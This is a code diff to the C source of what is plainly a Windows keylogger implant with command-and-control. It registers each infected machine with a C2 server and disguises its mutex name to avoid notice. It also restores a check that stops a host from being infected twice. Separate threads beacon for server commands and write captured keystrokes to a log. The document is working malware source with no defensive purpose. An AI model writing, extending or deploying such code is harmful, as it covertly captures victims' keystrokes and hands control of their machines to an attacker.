@@ -6,36 +6,35 @@
 #include "program.h"
 #include "../client/commands.h"
 
-/**
- * to make HTTPS traffic you can simply add the  INTERNET_FLAG_SECURE flag
- */
 
 PROGRAM_CONTEXT* progContext;
 
+/**
+ * Sets up the primary components of the program.
+ * Begins by initialising the program context global variable (1),
+ * it then registers the client with the C2 server (2) followed by 
+ * creating a mutex that will be utilised for safe threading (3).
+ * Lastly checks if the mutex already exists, if so this host is 
+ * already infected! (4) 
+ */
 ERR_CODE setup() {
-    // initialise PROGRAM_CONTEXT struct then register with the server
-    progContext = initProgramContext();
-    if (progContext == NULL) return ECODE_NULL;
-    printf("1) Program Init'ed\n");
+    progContext = initProgramContext(); // 1
+    if (progContext == NULL) 
+        return ECODE_NULL;
 
-    // register client 
-    int ret = registerClient(progContext->client);
-    if (ret != ECODE_SUCCESS) return ret;
-    printf("2) Cli Registered\n");
+    ERR_CODE ret = registerClient(progContext->client); // 2
+    if (ret != ECODE_SUCCESS) 
+        return ret;
 
-    // give the mutex a somehwat believeable name :) FALSE means we don't have to release from main thread
-    HANDLE hMutThrSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (hMutThrSync == NULL) return ECODE_NULL;
-    printf("3) Thread Sync Mutex Created\n\n");
+    // 3 create threading mutex with a somewhat believeable name :)
+    progContext->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
+    if (progContext->hMutexThreadSync == NULL) 
+        return ECODE_NULL;
 
-    // mutex already exists!
-    // THIS CODE IS COMMENTED FOR TESTING ONLY, THIS WAY WE CAN HAVE MULTIPLE VICTIMS ON THE SAME MACHINE!
-    // if (GetLastError() == ERROR_ALREADY_EXISTS) {
-    //     printf("Client is already infected!");
-    //     return 1;
-    // }
+    if (GetLastError() == ERROR_ALREADY_EXISTS) // 4 
+        return ECODE_SAFE_RET;
 
-    progContext->hMutexThreadSync = hMutThrSync;
+    printf("\nPROGRAM_CONTEXT initialised...\n\n");
     return ECODE_SUCCESS;
 }
 
@@ -45,7 +44,8 @@ ERR_CODE setup() {
  */
 PROGRAM_CONTEXT* initProgramContext() {
     PROGRAM_CONTEXT* prCon = (PROGRAM_CONTEXT *)malloc(sizeof(PROGRAM_CONTEXT));
-    if (prCon == NULL) return NULL;
+    if (prCon == NULL) 
+        return NULL;
 
     // create client structure
     prCon->client = initClient();
@@ -90,19 +90,17 @@ ERR_CODE startThreads() {
     // update the program context
     progContext->hCmdThread = hCmdThr;
     progContext->hWriteThread = hWriteThr;
-    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) return ECODE_NULL;
+    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) 
+        return ECODE_NULL;
     
-    runKeyLogger();
+    ERR_CODE ret = runKeyLogger();
 
     // wait for both threads to finish
-    HANDLE threads[2] = { 
-        progContext->hCmdThread, 
-        progContext->hWriteThread,
-    };
+    HANDLE threads[2] = { progContext->hCmdThread, progContext->hWriteThread };
     WaitForMultipleObjects(2, threads, TRUE, INFINITE);
 
     printf("Threads complete!\n");
-    return ECODE_SUCCESS;
+    return ret;
 }
 
 /**
@@ -114,8 +112,9 @@ ERR_CODE startThreads() {
  */
 DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
     while (!progContext->shutdown) {
-        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+        Sleep(SLP_CMD_THREAD);
 
+        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
         CLIENT_HANDLER* client = progContext->client;
 
         // get the commands from the server
@@ -128,9 +127,7 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
             if (ret == ECODE_DO_SHUTDOWN) doShutdown();
             if (ret != ECODE_SUCCESS)     printf("ECODE: %s\n", getErrMessage(ret));
         }
-
         ReleaseMutex(progContext->hMutexThreadSync);
-        Sleep(SLP_CMD_THREAD);
     }
     return 0;
 }
@@ -150,8 +147,9 @@ void doShutdown() {
  */
 DWORD WINAPI writeLogThread(LPVOID lpParam) {
     while (!progContext->shutdown) {
-        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+        Sleep(SLP_WRITER_THREAD);
 
+        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
         KEY_LOGGER* kLogger = progContext->kLogger;
 
         // skip the write if the buffer is empty
@@ -173,9 +171,7 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
         }
 
         skipWrite:
-
         ReleaseMutex(progContext->hMutexThreadSync);
-        Sleep(SLP_WRITER_THREAD);
     }
     return 0;
 }
